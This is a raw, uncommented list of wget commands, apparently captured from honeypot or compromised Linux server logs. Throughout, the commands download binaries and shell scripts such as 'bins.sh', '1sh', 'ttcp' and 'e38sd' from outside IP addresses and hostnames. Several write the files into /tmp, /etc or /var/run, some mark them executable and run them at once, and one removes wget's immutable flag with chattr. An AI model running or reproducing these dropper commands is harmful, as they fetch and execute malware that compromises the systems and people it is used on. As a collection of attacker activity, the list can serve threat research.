wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
wget  -c http://222.186.58.197:15471/ttcp
wget  -c http://222.186.58.197:15471/ttcp
wget  -c http://222.186.58.197:15471/ttcp
wget  -c http://222.186.58.197:15471/ttcp
wget  -c http://222.186.58.197:15471/ttcp
wget  -c http://222.186.58.197:15471/udxx
wget  -c http://222.186.58.197:15471/udxx
wget  -c http://222.186.58.197:15471/udxx
wget  -c http://222.186.58.197:15471/udxx
wget  -c http://222.186.58.197:15471/udxx
wget  -O /tmp/2360 http://54.226.68.162:15826/2360
wget  -O /tmp/2360 http://54.226.68.162:15826/2360
wget  -c http://117.21.226.95:9020/journal -P /etc
wget  -c http://117.21.226.95:9020/hades -P /etc
yum install -y wget
chmod  755 /usr/bin/wget
chattr  -i /usr/bin/wget
wget  -c http://204.44.93.41:10571/kingfor
wget  werwolf.3x.ro/test.py
wget  -O /tmp/23600 http://54.226.68.162:15826/23600
wget  -O /tmp/23600 http://54.226.68.162:15826/23600
wget  -O /tmp/23600 http://54.226.68.162:15826/23600
wget  -O /tmp/Linux2.6 http://218.2.0.127:4355/Linux2.6
wget  -O /tmp/23600 http://54.226.68.162:15826/23600
wget  -O /tmp/23600 http://54.226.68.162:15826/23600
wget  -O /tmp/23600 http://54.226.68.162:15826/23600
wget  -O /tmp/Linux2.6 http://218.2.0.127:4355/Linux2.6
wget  -c http://218.2.0.127:4355/Linux2.6
wget  -c http://14.29.50.125:15141/ttcp
wget  -c http://14.29.50.125:15141/ttcp
wget  -c http://14.29.50.125:15141/ttcp
wget  -c http://14.29.50.125:15141/ttcp
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  drkkenzor.16mb.com/Drk.py
wget  drkkenzor.16mb.com/Drk
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -c http://14.29.50.125:15141/ttcp
wget  -c http://14.29.50.125:15141/ttcp
wget  -c http://14.29.50.125:15141/ttcp
wget  -c http://155.94.163.19:15124/ttcp
wget  -O /tmp/ttcp http://155.94.163.19:15124/ttcp
wget  -O /tmp/ttcp http://155.94.163.19:15124/ttcp
wget  -O /tmp/ttcp http://155.94.163.19:15124/ttcp
wget  -c http://84.104.109.233/x/2sh -P /tmp
wget  -qO /root/- http://84.104.109.233/x/2sh
wget  -c http://84.104.109.233/x/1sh -P /var/run
wget  -qO - http://84.104.109.233/x/1sh
wget  -O /tmp/23600 http://54.226.68.162:15826/23600
wget  -c http://192.210.237.210/x/2sh -P /tmp
wget  -qO /root/- http://192.210.237.210/x/2sh
wget  -c http://192.210.237.210/x/1sh -P /var/run
wget  -qO - http://192.210.237.210/x/1sh
wget  -c http://192.210.237.210/x/2sh -P /tmp
wget  -qO /root/- http://192.210.237.210/x/2sh
wget  -c http://192.210.237.210/x/1sh -P /var/run
wget  -qO - http://192.210.237.210/x/1sh
wget  -c http://211.67.180.90:9063/lxw
wget  -O /tmp/etc168 http://23.234.25.140:20345/etc168
wget  dezlyhack.3x.ro/test.py
wget  http://0xplanet.com/archive/IRC/
wget  -O /tmp/etc168 http://23.234.25.140:20345/etc168
wget  http://185.11.146.134/bins.sh
wget  http://222.186.34.73:3345/tfboy
wget  http://222.186.34.73:3345/tfboy
wget  http://185.11.146.134/bins.sh
wget  kranehanibal.16mb.com/viteza.py
wget  http://221.229.172.44:81/e38sd chmod +x e38sd ./e38sd
wget  http://59.63.166.70:81/e38sd chmod +x e38sd ./e38sd
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
busybox  wget http://23.228.81.116:280/123.txt
wget http://23.228.81.116:280/123.txt
wget  http://59.63.166.70:81/i37rj chmod +x i37rj ./i37rj
wget  http://221.229.172.44:81/i37rj chmod +x i37rj ./i37rj
